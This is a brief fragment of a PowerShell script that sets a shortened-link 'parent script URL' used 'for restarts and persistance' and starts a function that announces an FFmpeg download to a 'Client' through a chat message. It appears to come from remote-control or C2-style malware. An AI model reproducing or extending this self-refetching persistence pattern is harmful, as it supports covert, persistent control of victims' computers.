...
$parent = "https://is.gd/027W1w" # parent script URL (for restarts and persistance)
...
Function GetFfmpeg{
    sendMsg -Message ":shallow_pan_of_food: ``Downloading FFmpeg to Client.. Please Wait and eat some Paella`` :shallow_pan_of_food:"
